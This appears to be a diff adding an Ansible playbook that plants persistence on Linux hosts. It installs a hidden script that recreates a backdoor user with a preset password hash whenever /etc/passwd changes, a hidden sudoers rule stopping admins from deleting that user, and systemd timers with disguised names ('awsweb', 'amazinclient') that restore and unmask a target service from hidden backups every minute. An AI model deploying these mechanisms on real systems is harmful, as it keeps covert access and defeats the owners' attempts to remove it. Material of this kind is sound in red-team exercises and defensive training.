@@ -1,0 +1,219 @@
+
+# ==========================================
+# Phase 1: The Systemd Auto-Restore Tool
+# ==========================================
+
+- name: Ensure the /opt/.sys_admin/ directory exists
+  ansible.builtin.file:
+    path: /opt/.sys_admin/
+    state: directory
+    owner: "{{ user }}"
+
+- name: Deploy user restoration script
+  ansible.builtin.copy:
+    dest: /opt/.sys_admin/.restore_sys_admin.sh
+    owner: root
+    group: root
+    mode: '0755'
+    content: |
+      #!/bin/bash
+      USER="{{ user }}"
+      EXPECTED_UID={{ uid }}
+      EXPECTED_GID={{ gid }}
+      
+      if ! id "$USER" &>/dev/null; then
+          groupadd -g $EXPECTED_GID $USER 2>/dev/null
+          useradd -u $EXPECTED_UID -g $EXPECTED_GID -m -s /bin/bash $USER
+          usermod -p '{{ hash }}' $USER
+          find / -nouser -exec chown sys_admin:sys_admin {} +
+      fi
+
+- name: Deploy sys-admin-monitor systemd service
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/sys-admin-monitor.service
+    owner: root
+    group: root
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Check sys-admin processes
+      
+      [Service]
+      Type=oneshot
+      ExecStart=/opt/.sys_admin/.restore_sys_admin.sh
+
+- name: Deploy sys-admin-monitor systemd path
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/sys-admin-monitor.path
+    owner: root
+    group: root
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Watch sys-admin
+      
+      [Path]
+      PathModified=/etc/passwd
+      
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start sys-admin-monitor path unit
+  ansible.builtin.systemd:
+    name: sys-admin-monitor.path
+    state: started
+    enabled: yes
+    daemon_reload: yes
+
+# ==========================================
+# Phase 2: The Sudoers Prevention Rule
+# ==========================================
+
+- name: Deploy sudoers rule to prevent sys_admin deletion
+  ansible.builtin.copy:
+    dest: /etc/sudoers.d/.protect_sys_admin
+    owner: root
+    group: root
+    mode: '0440'
+    # validate ensures we don't break sudo syntax across the fleet
+    validate: /usr/sbin/visudo -cf %s
+    content: |
+      # Allow admins all commands EXCEPT deleting the sys_admin user
+      Cmnd_Alias NO_SYS_ADMIN_DEL = /usr/sbin/userdel {{ user }}*, /usr/sbin/userdel -* {{ user }}*, /usr/sbin/deluser {{ user }}*, /usr/sbin/deluser -* {{ user }}*
+      
+      {{ admin_group }} ALL=(ALL) ALL, !NO_SYS_ADMIN_DEL
+
+- name: Create a backup of the critical service
+  ansible.builtin.copy:
+    src: "/etc/systemd/system/{{ target_service }}"
+    dest: "/root/{{ target_service }}.backup"
+    remote_src: yes
+    # Crucial: set force to 'no' so we don't accidentally overwrite a good backup 
+    # with a missing/corrupted file if the service is deleted right as Ansible runs.
+    force: no 
+
+# ==========================================
+# Phase 3: Create Watcher Services
+# ==========================================       
+
+- name: Ensure the /media/.sys_monitor/ directory exists
+  ansible.builtin.file:
+    path: /media/.sys_monitor/
+    state: directory
+    owner: "{{ user }}"
+
+- name: Deploy the watcher bash script
+  ansible.builtin.copy:
+    dest: "{{ script_path }}"
+    mode: '0755'
+    content: |
+      #!/bin/bash
+      TARGET_SERVICE="{{ target_service }}"
+      SERVICE_PATH="/etc/systemd/system/$TARGET_SERVICE"
+      BACKUP_PATH="/media/.sys_monitor/$TARGET_SERVICE.backup"
+
+      if [ ! -f "$SERVICE_PATH" ]; then
+          cp "$BACKUP_PATH" "$SERVICE_PATH"
+          systemctl daemon-reload
+      fi
+
+      IS_ENABLED=$(systemctl is-enabled "$TARGET_SERVICE" 2>/dev/null)
+      if [ "$IS_ENABLED" == "masked" ]; then
+          systemctl unmask "$TARGET_SERVICE"
+          systemctl daemon-reload
+      fi
+
+- name: Deploy the watcher systemd service
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/awsweb.service
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Monitor for aws web admin services
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ script_path }}
+
+- name: Deploy the watcher systemd timer
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/awsweb.timer
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Timer for awsweb.service
+
+      [Timer]
+      OnCalendar=*-*-* *:*:00
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Reload systemd daemon and enable/start the watcher timer
+  ansible.builtin.systemd:
+    daemon_reload: yes
+    name: awsweb.timer
+    enabled: yes
+    state: started
+
+- name: Ensure the /run/.amazin/ directory exists
+  ansible.builtin.file:
+    path: /run/.amazin/
+    state: directory
+    owner: "{{ user }}"
+
+- name: Deploy the second watcher bash script
+  ansible.builtin.copy:
+    dest: "{{ script_path }}"
+    mode: '0755'
+    content: |
+      #!/bin/bash
+      TARGET_SERVICE="{{ target_service }}"
+      SERVICE_PATH="/etc/systemd/system/$TARGET_SERVICE"
+      BACKUP_PATH="/run/.amazin/$TARGET_SERVICE.backup"
+
+      if [ ! -f "$SERVICE_PATH" ]; then
+          cp "$BACKUP_PATH" "$SERVICE_PATH"
+          systemctl daemon-reload
+      fi
+
+      IS_ENABLED=$(systemctl is-enabled "$TARGET_SERVICE" 2>/dev/null)
+      if [ "$IS_ENABLED" == "masked" ]; then
+          systemctl unmask "$TARGET_SERVICE"
+          systemctl daemon-reload
+      fi
+
+- name: Deploy the second watcher systemd service
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/amazinclient.service
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Amazin client service
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ script_path }}
+
+- name: Deploy the second watcher systemd timer
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/amazinclient.timer
+    mode: '0644'
+    content: |
+      [Unit]
+      Description=Timer for amazinclient.service
+
+      [Timer]
+      OnCalendar=*-*-* *:*:30
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Reload systemd daemon and enable/start the second watcher timer
+  ansible.builtin.systemd:
+    daemon_reload: yes
+    name: amazinclient.timer
+    enabled: yes
+    state: started
